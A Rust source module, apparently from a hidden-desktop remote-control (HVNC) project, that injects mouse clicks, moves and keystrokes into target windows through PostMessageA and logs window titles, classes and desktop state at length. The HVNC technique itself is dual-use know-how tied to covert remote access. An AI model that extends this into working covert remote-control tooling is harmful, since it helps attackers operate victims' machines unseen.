//! Improved input handling for hidden desktop applications
//! 
//! This module provides better input handling specifically designed for hidden desktop scenarios
//! using direct PostMessageA to window handles instead of desktop context switching.

use crate::{HvncError, Result};
use crate::common::{InputEvent, MouseButton};
use crate::host::{WindowHandle, DesktopHandle};
use std::mem;
use winapi::um::winuser::{
    PostMessageA, SetForegroundWindow, GetForegroundWindow,
    WM_LBUTTONDOWN, WM_LBUTTONUP, WM_RBUTTONDOWN, WM_RBUTTONUP, 
    WM_MBUTTONDOWN, WM_MBUTTONUP, WM_MOUSEMOVE, WM_KEYDOWN, WM_KEYUP,
};
use log::{debug, warn, error, info};

/// Improved input handler for hidden desktop scenarios
pub struct ImprovedInputHandler {
    target_window: Option<WindowHandle>,
}

impl ImprovedInputHandler {
    /// Create a new improved input handler
    pub fn new() -> Result<Self> {
        Ok(Self {
            target_window: None,
        })
    }
    
    /// Set the target window for input operations
    pub fn set_target_window(&mut self, window: WindowHandle) -> Result<()> {
        self.target_window = Some(window);
        debug!("Target window set for input handler: {:?}", window);
        Ok(())
    }
    
    /// Ensure the target window is focused for input
    fn focus_target_window(&self) -> Result<()> {
        if let Some(window) = self.target_window {
            // Check if window is already focused
            let foreground_window = unsafe { GetForegroundWindow() };
            if foreground_window != window {
                debug!("Focusing target window: {:?}", window);
                let result = unsafe { SetForegroundWindow(window) };
                if result == 0 {
                    let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
                    warn!("Failed to focus target window. Error code: {}", error_code);
                    // Don't return error - continue trying to send messages
                } else {
                    debug!("Successfully focused target window");
                    // Note: Small delay removed - async context doesn't allow blocking sleep
                    // Window focus should take effect immediately for PostMessageA
                }
            }
        }
        Ok(())
    }
    
    /// Handle mouse click using PostMessageA directly to window
    pub fn handle_mouse_click(
        &self,
        x: i32,
        y: i32,
        button: MouseButton,
        pressed: bool,
    ) -> Result<()> {
        info!("🖱️ HVNC MOUSE DEBUG: Handling mouse click: ({}, {}) button: {:?} pressed: {}", x, y, button, pressed);
        
        let window = self.target_window.ok_or_else(|| {
            HvncError::Connection("No target window set for input".to_string())
        })?;
        
        // 🐛 DEBUG: Validate window handle
        let is_window_valid = unsafe { winapi::um::winuser::IsWindow(window) != 0 };
        if !is_window_valid {
            error!("❌ HVNC MOUSE ERROR: Invalid window handle for mouse click: {:?}", window);
            return Err(HvncError::Connection("Invalid window handle for input".to_string()));
        }
        
        info!("✅ HVNC MOUSE DEBUG: Window handle validated successfully");
        
        // Focus the target window to ensure it can receive input
        info!("🎯 HVNC MOUSE DEBUG: Attempting to focus target window");
        self.focus_target_window()?;
        info!("✅ HVNC MOUSE DEBUG: Window focus completed");
        
        // Determine the appropriate Windows message
        let message = match (button.clone(), pressed) {
            (MouseButton::Left, true) => WM_LBUTTONDOWN,
            (MouseButton::Left, false) => WM_LBUTTONUP,
            (MouseButton::Right, true) => WM_RBUTTONDOWN,
            (MouseButton::Right, false) => WM_RBUTTONUP,
            (MouseButton::Middle, true) => WM_MBUTTONDOWN,
            (MouseButton::Middle, false) => WM_MBUTTONUP,
        };
        
        // Create lParam with coordinates
        let lparam = ((y as u32) << 16) | (x as u32 & 0xFFFF);
        
        info!("📨 HVNC MOUSE DEBUG: Sending message - Type: 0x{:X}, Window: {:?}, lParam: 0x{:X} (x={}, y={})", 
              message, window, lparam, x, y);
        
        // 🚀 HVNC Technique: Use PostMessageA directly to window without desktop switching
        let result = unsafe {
            PostMessageA(window, message, 0, lparam as isize)
        };
        
        if result == 0 {
            let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
            error!("❌ HVNC MOUSE ERROR: Failed to post mouse click message. Error code: {}", error_code);
            
            // Additional debugging - check if window still exists
            let still_valid = unsafe { winapi::um::winuser::IsWindow(window) != 0 };
            error!("🔍 HVNC MOUSE DEBUG: Window still valid after error: {}", still_valid);
            
            return Err(HvncError::windows_api_with_code(
                "Failed to post mouse click message", error_code
            ));
        }
        
        info!("✅ HVNC MOUSE DEBUG: Mouse click message sent successfully - result: {}", result);
        Ok(())
    }
    
    /// Handle mouse move using PostMessageA directly to window
    pub fn handle_mouse_move(&self, x: i32, y: i32) -> Result<()> {
        info!("🖱️ HVNC MOUSE MOVE DEBUG: Handling mouse move to coordinates ({}, {})", x, y);
        
        let window = self.target_window.ok_or_else(|| {
            HvncError::Connection("No target window set for input".to_string())
        })?;
        
        // 🐛 DEBUG: Validate window handle
        let is_window_valid = unsafe { winapi::um::winuser::IsWindow(window) != 0 };
        if !is_window_valid {
            error!("❌ HVNC MOUSE MOVE ERROR: Invalid window handle: {:?}", window);
            return Err(HvncError::Connection("Invalid window handle for input".to_string()));
        }
        
        info!("✅ HVNC MOUSE MOVE DEBUG: Window handle validated successfully");
        
        // Focus the target window to ensure it can receive input
        info!("🎯 HVNC MOUSE MOVE DEBUG: Attempting to focus target window");
        self.focus_target_window()?;
        info!("✅ HVNC MOUSE MOVE DEBUG: Window focus completed");
        
        // Create the lParam with coordinates
        let lparam = ((y as u32) << 16) | (x as u32 & 0xFFFF);
        
        info!("📨 HVNC MOUSE MOVE DEBUG: Sending WM_MOUSEMOVE - Window: {:?}, Coords: ({}, {}), lParam: 0x{:X}", 
              window, x, y, lparam);
        
        // 🚀 HVNC Technique: Use PostMessageA for mouse move
        let result = unsafe {
            PostMessageA(window, WM_MOUSEMOVE, 0, lparam as isize)
        };
        
        if result == 0 {
            let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
            error!("❌ HVNC MOUSE MOVE ERROR: Failed to post mouse move message. Error code: {}", error_code);
            
            // Additional debugging - check if window still exists
            let still_valid = unsafe { winapi::um::winuser::IsWindow(window) != 0 };
            error!("🔍 HVNC MOUSE MOVE DEBUG: Window still valid after error: {}", still_valid);
            
            return Err(HvncError::windows_api_with_code(
                "Failed to post mouse move message", error_code
            ));
        }
        
        info!("✅ HVNC MOUSE MOVE DEBUG: Mouse move message sent successfully - result: {}", result);
        Ok(())
    }
    
    /// Handle keyboard event using PostMessageA directly to window
    pub fn handle_keyboard_event(&self, keycode: u32, pressed: bool) -> Result<()> {
        info!("⌨️ HVNC KEYBOARD DEBUG: Handling keyboard event: keycode {} {}", keycode, if pressed { "pressed" } else { "released" });
        
        let window = self.target_window.ok_or_else(|| {
            HvncError::Connection("No target window set for input".to_string())
        })?;
        
        // Validate keycode (Windows virtual key codes are 0-255)
        if keycode > 255 {
            return Err(HvncError::Connection(format!("Invalid keycode: {}", keycode)));
        }
        
        // 🐛 DEBUG: Validate window handle
        let is_window_valid = unsafe { winapi::um::winuser::IsWindow(window) != 0 };
        if !is_window_valid {
            error!("❌ HVNC KEYBOARD ERROR: Invalid window handle for keyboard event: {:?}", window);
            return Err(HvncError::Connection("Invalid window handle for input".to_string()));
        }
        
        info!("✅ HVNC KEYBOARD DEBUG: Window handle validated successfully");
        
        // Focus the target window to ensure it can receive input
        info!("🎯 HVNC KEYBOARD DEBUG: Attempting to focus target window");
        self.focus_target_window()?;
        info!("✅ HVNC KEYBOARD DEBUG: Window focus completed");
        
        // Determine the appropriate Windows message
        let message = if pressed { WM_KEYDOWN } else { WM_KEYUP };
        
        info!("📨 HVNC KEYBOARD DEBUG: Sending message - Type: 0x{:X}, Window: {:?}, wParam: {} (keycode)", 
              message, window, keycode);
        
        // 🚀 HVNC Technique: Use PostMessageA directly to window
        let result = unsafe {
            PostMessageA(window, message, keycode as usize, 0)
        };
        
        if result == 0 {
            let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
            error!("❌ HVNC KEYBOARD ERROR: Failed to post keyboard message. Error code: {}", error_code);
            
            // Additional debugging - check if window still exists
            let still_valid = unsafe { winapi::um::winuser::IsWindow(window) != 0 };
            error!("🔍 HVNC KEYBOARD DEBUG: Window still valid after error: {}", still_valid);
            
            return Err(HvncError::windows_api_with_code(
                "Failed to post keyboard message", error_code
            ));
        }
        
        info!("✅ HVNC KEYBOARD DEBUG: Keyboard message sent successfully - result: {}", result);
        Ok(())
    }
    
    /// Process a generic input event
    pub async fn process_input_event(&self, event: InputEvent) -> Result<()> {
        info!("🎮 HVNC INPUT DEBUG: Processing input event: {:?}", event);
        
        let window = self.target_window.ok_or_else(|| {
            error!("❌ HVNC INPUT ERROR: No target window set for input processing");
            HvncError::Connection("No target window set for input processing".to_string())
        })?;
        
        info!("🎯 HVNC INPUT DEBUG: Target window handle: {:?} (0x{:X})", window, window as usize);
        
        // 🐛 DEBUG: Validate window handle before processing
        let is_window_valid = unsafe { winapi::um::winuser::IsWindow(window) != 0 };
        let is_window_visible = unsafe { winapi::um::winuser::IsWindowVisible(window) != 0 };
        let is_window_enabled = unsafe { winapi::um::winuser::IsWindowEnabled(window) != 0 };
        
        info!("🔍 HVNC INPUT DEBUG: Window state - valid: {}, visible: {}, enabled: {}", 
              is_window_valid, is_window_visible, is_window_enabled);
        
        if !is_window_valid {
            error!("❌ HVNC INPUT ERROR: Invalid window handle during event processing: {:?}", window);
            return Err(HvncError::Connection("Invalid window handle for input processing".to_string()));
        }
        
        // 🏷️ DEBUG: Get window title and class name for identification
        let mut window_title = [0u8; 256];
        let title_len = unsafe { 
            winapi::um::winuser::GetWindowTextA(window, window_title.as_mut_ptr() as *mut i8, 256) 
        };
        let title_str = if title_len > 0 {
            std::str::from_utf8(&window_title[..title_len as usize]).unwrap_or("Unknown")
        } else {
            "No Title"
        };
        
        let mut class_name = [0u8; 256];
        let class_name_len = unsafe { 
            winapi::um::winuser::GetClassNameA(window, class_name.as_mut_ptr() as *mut i8, 256) 
        };
        let class_name_str = if class_name_len > 0 {
            std::str::from_utf8(&class_name[..class_name_len as usize]).unwrap_or("Unknown")
        } else {
            "Unknown"
        };
        
        info!("🏷️ HVNC INPUT DEBUG: Target window - Title: '{}', Class: '{}'", title_str, class_name_str);
        
        // 📐 DEBUG: Get window rectangle for coordinate mapping context
        let mut window_rect = winapi::shared::windef::RECT { left: 0, top: 0, right: 0, bottom: 0 };
        let rect_result = unsafe { winapi::um::winuser::GetWindowRect(window, &mut window_rect) };
        if rect_result != 0 {
            info!("📐 HVNC INPUT DEBUG: Window rect - left: {}, top: {}, right: {}, bottom: {}", 
                  window_rect.left, window_rect.top, window_rect.right, window_rect.bottom);
            info!("📐 HVNC INPUT DEBUG: Window size - width: {}, height: {}", 
                  window_rect.right - window_rect.left, window_rect.bottom - window_rect.top);
        } else {
            warn!("⚠️ HVNC INPUT WARNING: Could not get window rectangle for coordinate context");
        }
        
        // 🖥️ DEBUG: Check which desktop the window belongs to
        let window_desktop = unsafe { winapi::um::winuser::GetThreadDesktop(winapi::um::winuser::GetWindowThreadProcessId(window, std::ptr::null_mut())) };
        let current_desktop = unsafe { winapi::um::winuser::GetThreadDesktop(winapi::um::processthreadsapi::GetCurrentThreadId()) };
        
        info!("🖥️ HVNC INPUT DEBUG: Window desktop: {:?}, Current desktop: {:?}, Same: {}", 
              window_desktop, current_desktop, window_desktop == current_desktop);
        
        // 🎯 DEBUG: Check current foreground window
        let foreground_window = unsafe { winapi::um::winuser::GetForegroundWindow() };
        info!("🎯 HVNC INPUT DEBUG: Current foreground window: {:?}, Is target: {}", 
              foreground_window, foreground_window == window);
        
        // Process the specific input event type
        match event {
            InputEvent::MouseClick { x, y, button, pressed } => {
                info!("🖱️ HVNC INPUT DEBUG: Processing mouse click at ({}, {}) - button: {:?}, pressed: {}", 
                      x, y, button, pressed);
                self.handle_mouse_click(x, y, button, pressed)?;
            }
            InputEvent::MouseMove { x, y } => {
                info!("🖱️ HVNC INPUT DEBUG: Processing mouse move to ({}, {})", x, y);
                self.handle_mouse_move(x, y)?;
            }
            InputEvent::KeyboardEvent { keycode, pressed } => {
                info!("⌨️ HVNC INPUT DEBUG: Processing keyboard event - keycode: {}, pressed: {}", 
                      keycode, pressed);
                self.handle_keyboard_event(keycode, pressed)?;
            }
        }
        
        info!("✅ HVNC INPUT DEBUG: Input event processed successfully");
        Ok(())
    }
}